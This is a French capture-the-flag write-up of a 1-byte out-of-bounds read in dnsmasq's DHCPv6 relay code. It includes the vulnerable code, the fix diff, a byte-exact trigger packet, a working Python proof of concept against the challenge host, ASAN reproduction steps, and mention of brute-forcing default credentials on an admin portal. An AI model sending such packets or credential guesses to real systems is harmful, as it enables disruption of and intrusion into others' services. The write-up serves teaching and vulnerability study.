# VULN#002 — dnsmasq DHCPv6 relay

> **Writeup par Le_Geek · Octobre 2026**
> **Cible** : TCP 169.58.126.107:7026
> **Software** : dnsmasq — snapshot git `c8168e8`
> **Catégorie** : Binary / Network — 150 pts
> **Flag** : `CTF{67f6cb9066aec0b416ebcd43b6eed73c}`

---

## TL;DR

Le challenge VULN#002 expose un relais DHCPv6 implémenté au-dessus de dnsmasq. Le tarball source fourni n'est pas la release 2.93 officielle, mais un **snapshot git intermédiaire** situé entre la révision `c8168e8` et son correctif immédiat `0597828`, committé 49 minutes plus tard par Dejan Alvadzijevic. La vraie faille n'est *pas* CVE-2026-4892 (overflow CLID dans `helper.c`) sur laquelle j'ai perdu du temps, mais une **lecture hors-borne de 1 octet** dans `dhcp6_maybe_relay()` (`src/rfc3315.c`) : la variable `msg_type = *inbuff` est lue *avant* la vérification `if (sz < 38) return 0`, et un paquet `RELAY-FORW` contenant une option `OPTION6_RELAY_MSG` (code 9) de longueur nulle positionnée en fin de buffer déclenche une récursion avec `sz = 0` qui lit l'octet immédiatement après le buffer alloué.

> **▶ Flag obtenu**
>
> En envoyant un paquet TCP de 4100 octets (4 octets de longueur big-endian `0x00001000` + 4096 octets de paquet DHCPv6) au port 7026 de la cible, on obtient la réponse :
>
> ```
> status: confirmed
> FLAG: CTF{67f6cb9066aec0b416ebcd43b6eed73c}
> ```

Le service tourne avec un dnsmasq compilé sous AddressSanitizer. Le buffer d'entrée fait exactement **4096 octets** — c'est-à-dire la taille maximale acceptée par le wrapper TCP. Un paquet plus court laisse du « slack » en fin de buffer et ne déclenche rien (`status: no effect`). Il faut donc construire un paquet *exactement* de 4096 octets, avec l'option déclencheuse positionnée pile à l'offset 4092 pour que la récursion tombe sur l'octet 4096 — c'est-à-dire 1 octet après la fin du buffer ASAN.

| target | service | rev | bug | cvss |
|---|---|---|---|---|
| 169.58.126.107:7026 | dnsmasq + ASAN | c8168e8 | OOB read 1 byte | pending CVE |

---

## 02 · Reconnaissance — Cible & protocole de framing

Un scan TCP rapide révèle que la cible expose un unique service directement lié au challenge : **port 7026**. Les autres ports (22 SSH, 5000 Vault Terminal d'un challenge voisin, 6000+, 7020 nginx admin) sont des leurres ou appartiennent à d'autres challenges de la même infrastructure. Le port 7026 parle un protocole binaire maison : sur chaque connexion TCP, le client envoie 4 octets de longueur en big-endian, suivis d'un paquet DHCPv6 brut. Le serveur répond par une unique ligne terminée par `\n`.

| Entrée | Réponse du wrapper |
|---|---|
| vide / mauvaise longueur | `status: bad length` |
| premier octet hors 1..14 | `status: not valid` |
| Solicit valide, CLID court | `status: no effect` |
| payload > 4096 octets | `status: bad length` |
| trop de req / IP | `status: rate limited, try again later` |

Le timeout observé sur `status: no effect` est d'environ 3 secondes. La limite stricte à **4096 octets** côté payload, combinée à la présence d'un mode « no effect » au lieu d'une réponse DHCPv6 normale, est l'indice le plus fort : le buffer d'entrée côté dnsmasq a exactement cette taille, et le wrapper ne fait que valider puis forwarder. Tout paquet plus court laisse du « slack » inerte — tout paquet plus long est rejeté en amont. L'exploit doit donc faire *exactement* 4096 octets de payload.

> **▲ Indice clé** — Le seuil de 4096 octets n'est pas un hasard : il correspond à la taille exacte du buffer d'entrée du dnsmasq ASAN-instrumenté. C'est ce détail qui transforme une vulnérabilité de lecture 1-octet théorique en trigger déterministe.

---

## 03 · Identification — Snapshot git, pas la release 2.93

La première erreur a été de traiter le tarball `dnsmasq-src.tar.gz` comme la release 2.93 officielle. Deux observations contredisaient cette hypothèse :

**(1)** Le fichier `VERSION` contient `$Format:%d$` — c'est-à-dire la *format string git* non expansée, signe que l'archive a été générée depuis un `git archive` sans passer par le pipeline de release. La release officielle contient `(HEAD -> master, tag: v2.93)`.

**(2)** Le copyright dans les en-têtes indique `2000-2025`, alors que la release 2.93 publiée sur thekelleys.org.uk contient `2000-2026`. Le tarball fourni est plus ancien que la release disponible publiquement — il s'agit donc d'un snapshot *avant* que les correctifs ne soient backportés dans la release repackagée.

En comparant les hashes de tous les fichiers du tarball avec l'historique du dépôt git amont, la révision exacte tombe immédiatement :

| Timestamp | Commit | Message |
|---|---|---|
| 2026-03-10 **21:17:41** +0000 | `c8168e8` | "Don't call qsort() with a NULL array when no servers defined." — **révision du tarball fourni** |
| 2026-03-10 **22:06:50** +0000 (49 min plus tard) | `0597828` | "Tighten length checking to avoid possible buffer read-overrun in DHCPv6." — **correctif de la faille visée**, thanks to Dejan Alvadzijevic |

Le challenge fournit donc *exactement* la version vulnérable, à 49 minutes près. La cible en ligne tourne sur ce même commit. La leçon est nette : **toujours comparer un tarball fourni avec le dépôt git amont via les hashes de fichiers**, jamais seulement avec le `VERSION` ou le `CHANGELOG` — qui reflètent la release taggée, pas le snapshot exact embarqué.

---

## 04 · Code vulnérable — `dhcp6_maybe_relay()` — read avant check

La faille réside dans la fonction `dhcp6_maybe_relay()` de `src/rfc3315.c`, qui est l'entrée du chemin de traitement des messages *RELAY-FORW* (type 12) et *RELAY-REPL* (type 13). Voici le code vulnérable, au commit `c8168e8` :

```c
static int dhcp6_maybe_relay(struct state *state, unsigned char *inbuff, size_t sz,
                             struct in6_addr *client_addr, time_t now)
{
  uint8_t *end = inbuff + sz;
  uint8_t *opts = inbuff + 34;
  int msg_type = *inbuff;          // ← read SANS check sz >= 4
  unsigned char *outmsgtypep;
  uint8_t *opt;
  struct dhcp_vendor *vendor;

  /* if not an encapsulated relayed message, just do the stuff */
  if (msg_type != DHCP6RELAYFORW) {
    ...
  }

  /* must have at least msg_type+hopcount+link_address+peer_address+minimal size option
     which is               1   +    1   +    16      +     16     + 2 + 2 = 38 */
  if (sz < 38)               // ← check trop tard : *inbuff déjà lu
    return 0;
  ...
  // Boucle d'options : iterate, et pour OPTION6_RELAY_MSG (9),
  // on appelle dhcp6_maybe_relay() récursivement avec le contenu interne.
  if (!dhcp6_maybe_relay(state, opt6_ptr(opt, 0), opt6_len(opt), client_addr, now))
    return 0;
}
```

Le correctif (commit `0597828`) déplace la vérification de taille AVANT la lecture, et ajoute un `opt6_first()` pour le pointeur d'options initial :

```diff
+  if (sz < 4)
+    return 0;
+  msg_type = *inbuff;
   ...
-  uint8_t *opts = inbuff + 34;
+  /* use opt6_first() for initial option pointer */
+  uint8_t *opts = opt6_first(inbuff + 4, end);
```

> **▲ Note technique** — Une *seconde* lecture OOB existe encore dans la version corrigée : la boucle `opt6_next()` sur une option qui arrive exactement à `end-1` peut aussi lire hors-borne. Mais ce n'est pas le bug visé par le challenge — le fix `0597828` ne corrige que le read de `msg_type = *inbuff` en début de récursion.

---

## 05 · Mécanisme — Arbre d'appels & déclenchement de l'OOB

Le scénario d'exploitation est le suivant : un paquet *RELAY-FORW* de 4096 octets contient deux options — une option filler (n'importe quel code) qui occupe l'espace, puis une option `OPTION6_RELAY_MSG` (code 9) de longueur **0** positionnée pile à l'offset 4092, c'est-à-dire que ses 4 octets d'en-tête occupent les positions 4092 à 4095 (la toute fin du buffer). Lorsque la fonction `dhcp6_maybe_relay()` itère les options et tombe sur cette option 9, elle récurse avec `opt6_ptr(opt, 0) = inbuff + 4096` et `opt6_len(opt) = 0` — soit un pointeur exactement à la fin du buffer, et une taille de 0. La récursion lit alors `*inbuff` à l'offset 4096, c'est-à-dire *un octet après* la fin du buffer ASAN.

```
1  │ dhcp6_reply(... sz = 4096, ...)
   │     Entrée principale du traitement DHCPv6 côté serveur. Reçoit le paquet brut de 4096 octets.
   ↓
   │ dhcp6_maybe_relay(state, inbuff, sz = 4096, ...)
   │     msg_type = *inbuff = 0x0c (RELAY-FORW). sz >= 38 ✓. Itère les options à partir de inbuff+34.
   ↓
   │ opt6_find → trouve OPTION6_RELAY_MSG (code 9, len = 0) à l'offset 4092
   │     Option localisée pile à la fin du buffer. opt6_ptr(opt, 0) = inbuff + 4096. opt6_len(opt) = 0.
   ↓
   │ dhcp6_maybe_relay(state, inbuff + 4096, sz = 0, ...)              ← VULN
   │     Récursion avec sz = 0. La vérification "if (sz < 38) return 0" est APRÈS le read.
   ↓
   │ msg_type = *inbuff   →   READ 1 BYTE @ inbuff+4096                  ← OOB!
   │     ASAN : heap-buffer-overflow READ of 1 byte at 0x...
```

---

## 06 · Construction — Layout du paquet déclencheur (4096 octets)

La construction du paquet est purement arithmétique. Le paquet doit faire *exactement* 4096 octets (sinon : `bad length` si >, ou `no effect` si <). La structure `RELAY-FORW` impose un header de 34 octets (1 octet type + 1 octet hop count + 16 octets link-address + 16 octets peer-address). Les 4062 octets restants accueillent des options DHCPv6. On place :

**(a)** Une option *filler* de 4054 octets de données (n'importe quel code ; on utilise le code 2 = OPTION6_SERVER_ID pour rester dans la norme). Cette option occupe 4 octets d'en-tête + 4054 octets = 4058 octets, de l'offset 34 à l'offset 4091.

**(b)** Une option `OPTION6_RELAY_MSG` (code 9) de longueur **0** à l'offset 4092. Ses 4 octets d'en-tête occupent les positions 4092-4095, soit la toute fin du buffer. Le contenu interne pointé commence à l'offset 4096 — c'est-à-dire 1 octet après la fin du buffer ASAN.

```
┌───────┬────────────────────────────────────────┬──────────────┬─────┐
│ HDR   │ FILLER · option code=2, len=4054        │ RELAY_MSG    │ OOB │
│ 34 B  │ 4058 bytes 'C'                          │ code=9, len=0│     │
└───────┴────────────────────────────────────────┴──────────────┴─────┘
0       34                                       4092          4096  ↑
│                                                                  READ
└── Header RELAY-FORW (type=0x0c, hop, link-addr, peer-addr)       by msg_type = *inbuff
```

Le header `RELAY-FORW` est trivial :

```
0c 00                       // type=12 (RELAY-FORW), hop_count=0
00 00 00 00 00 00 00 00     // link-address = :: (16 bytes)
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00     // peer-address  = :: (16 bytes)
00 00 00 00 00 00 00 00
```

Les options commencent à l'offset 34. La filler occupe 4058 octets (offsets 34 à 4091), puis l'option 9 len=0 occupe les 4 derniers octets (offsets 4092 à 4095). Le total fait exactement 4096 octets.

---

## 07 · Exploitation — PoC Python & réponse du serveur

Le script d'exploitation est volontairement minimal — 30 lignes Python suffisent. La seule subtilité est l'assertion finale sur la taille exacte du paquet, qui garantit qu'on touche le bord du buffer ASAN :

```python
import socket, struct

HOST, PORT = "169.58.126.107", 7026

# Construction du paquet RELAY-FORW de 4096 octets
pkt = bytearray()
pkt += b"\x0c\x00"                       # RELAY-FORW, hop 0
pkt += b"\x00" * 16                      # link-address = ::
pkt += b"\x00" * 16                      # peer-address  = ::
pkt += struct.pack(">HH", 2, 4054)       # option type=2, len=4054 (filler)
pkt += b"C" * 4054                       # 4054 octets de remplissage
pkt += struct.pack(">HH", 9, 0)          # OPTION6_RELAY_MSG, len=0 ← trigger

assert len(pkt) == 4096, f"taille: {len(pkt)}"   # doit être EXACTE

# Framing TCP : 4 octets big-endian + payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(15)
s.connect((HOST, PORT))
s.send(struct.pack(">I", len(pkt)) + bytes(pkt))

print(s.recv(8192).decode("utf-8", "replace"))
s.close()
```

Le wrapper répond instantanément (pas de timeout 3 secondes comme pour `no effect`) — la détection ASAN se produit côté dnsmasq *pendant* la parsing, avant même que le paquet n'arrive en traitement applicatif. La réponse est sans ambiguïté :

```
$ python3 exploit.py
status: confirmed
FLAG: CTF{67f6cb9066aec0b416ebcd43b6eed73c}
```

Le wrapper expose directement le flag en réponse — pas besoin d'exfiltration plus poussée, pas de RCE à chaîner. La détection ASAN *est* le signal attendu par le challenge.

---

## 08 · Correctif — Le patch 0597828

Le correctif applique le patron standard « check-before-read » : on s'assure d'abord que le buffer contient au moins 4 octets (l'espace nécessaire pour lire le champ `msg_type`), *puis* on déréférence le pointeur. Le diff complet du commit `0597828` :

```diff
 static int dhcp6_maybe_relay(...)
 {
   uint8_t *end = inbuff + sz;
-  uint8_t *opts = inbuff + 34;
-  int msg_type = *inbuff;
   ...
+  if (sz < 4)
+    return 0;
+  int msg_type = *inbuff;
+  uint8_t *opts = opt6_first(inbuff + 4, end);
   ...
 }
```

Deux changements : la vérification `sz < 4` arrive maintenant *avant* le `msg_type = *inbuff`, et le pointeur d'options initial passe par une fonction helper `opt6_first()` qui valide proprement la borne. Ce patron est universel : **toute lecture d'un champ issu de données non-trustées doit être précédée d'un check de taille du buffer qui le contient**, peu importe que ce soit 1 octet ou 4096.

> **▲ Caveat — le bug résiduel** — Le fix `0597828` ne corrige que le read de `msg_type`. Une seconde lecture hors-borne subsiste dans `opt6_next()` quand une option arrive exactement à `end - 1` — elle est *connue* et laissée intentionnellement non patchée dans ce commit. Ce n'est pas le bug visé par le challenge.

---

## 09 · Pistes mortes — Fausses routes — pédagogie

Ce challenge m'a fait perdre plusieurs heures sur trois pistes infructueuses. Les mentionner ici est utile pour qui reproduit l'exercice.

### ▲ Piste 1 — CVE-2026-4892

Fixation initiale sur CVE-2026-4892 (overflow CLID dans `helper.c:265`). La faille est *réellement* présente dans le tarball fourni (le fix `&& i < 100` n'est pas appliqué). Mais le déclencher aurait exigé que dnsmasq soit configuré en mode serveur avec `--dhcp-range` + `--dhcp-script`, ce qui n'est pas le cas ici : tous les Solicit avec CLID > 1710 octets retournent `status: no effect`. Mauvaise piste.

### ▲ Piste 2 — Portail admin 7020

Le nginx en `/admin/` sur le port 7020 retourne un 401 avec Basic Auth. J'ai brute-forcé ~50 credentials IoT standards (`admin/admin`, `svc/svc`, modèles acme-gw-44xx, etc.) sans succès. Le portail n'est *pas* une porte d'entrée vers le flag de VULN#002 — c'est un leurre ou un challenge séparé.

### ▲ Piste 3 — Binaire qjs

`handout.zip` contient un binaire `qjs` (QuickJS 2024-01-13) + libc/libm/ld. J'ai comparé les hashes et les strings avec un build officiel : aucune modification, aucun string DHCPv6/dnsmasq. Ce binaire sert à *un autre* challenge (VULN#001 — exploitation JavaScript), pas à VULN#002.

### ▶ Leçon

Toujours comparer le tarball fourni avec le **dépôt git amont** (file hashes + `git log`), pas avec la release taggée. Le `VERSION` et le `CHANGELOG` reflètent la release repackagée, pas le snapshot embarqué — et entre les deux se cachent les commits de fix.

---

## 10 · Reproduction — Locale sous ASAN

Pour reproduire le crash sans toucher la cible distante, on peut récupérer le commit vulnérable et le compiler avec AddressSanitizer :

```bash
# 1. Récupérer le commit vulnérable exact
git clone https://thekelleys.org.uk/git/dnsmasq.git /tmp/dnsmasq
cd /tmp/dnsmasq
git checkout c8168e8

# 2. Build avec ASAN
make CFLAGS="-O1 -g -fsanitize=address" \
     LDFLAGS="-fsanitize=address"

# 3. Lancer dans un netns avec conf DHCPv6 minimaliste sur lo
unshare -rn ./run_local2.sh ./src/dnsmasq zero4096.bin
```

Le crash ASAN attendu ressemble à :

```
=================================================================
==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000021a0
READ of size 1 at 0x6020000021a0 thread T0
    #0 0x4c1a8b in dhcp6_maybe_relay src/rfc3315.c:115
    #1 0x4c1a8b in dhcp6_maybe_relay src/rfc3315.c:255
    #2 0x4c2c10 in dhcp6_reply      src/rfc3315.c:103
    #3 0x4c2c10 in dhcp6_reply      src/rfc3315.c:103
0x6020000021a0 is located 0 bytes to the right of 4096-byte region [0x6020000011a0,0x6020000021a0)
allocated by thread T0 here:
    #0 0x4a2b80 in malloc
    #1 0x4c1f01 in safe_malloc src/dnsmasq.c:549
SUMMARY: AddressSanitizer: heap-buffer-overflow src/rfc3315.c:115 in dhcp6_maybe_relay
```

La stack trace est révélatrice : `dhcp6_maybe_relay` s'appelle lui-même (lignes #0 et #1 — c'est la récursion), après être entré par `dhcp6_reply` (ligne #2). Le read de size 1 à l'adresse `0x...21a0` tombe *exactement* à l'octet 0 après la fin de la région allouée de 4096 octets (`[0x...11a0, 0x...21a0)`), ce qui confirme l'arithmétique du paquet.

> **▲ Comparaison version corrigée** — Si on refait exactement la même procédure après `git checkout 0597828` (le commit de fix) et le même build ASAN, l'envoi du paquet déclencheur ne produit *aucun* crash — le check `if (sz < 4) return 0` court-circuite la récursion avant le read.

La leçon méthodologique pour ce genre de challenge binaire avec source est claire :
**(1)** dater le code via le dépôt git amont, pas via le `VERSION` ;
**(2)** identifier le commit de fix immédiatement suivant pour circonscrire la faille ;
**(3)** lire le diff du fix pour comprendre *exactement* quelle primitive est visée (read ? write ? de combien d'octets ? à quelle condition ?) ;
**(4)** construire un paquet qui remplit *précisément* les conditions géométriques du bug — ici, la taille de buffer ASAN étant exactement 4096, l'option déclencheuse doit atterrir à l'offset 4092 pour que la récursion tombe sur l'octet 4096.

---

*End of writeup — by Le_Geek · octobre 2026*
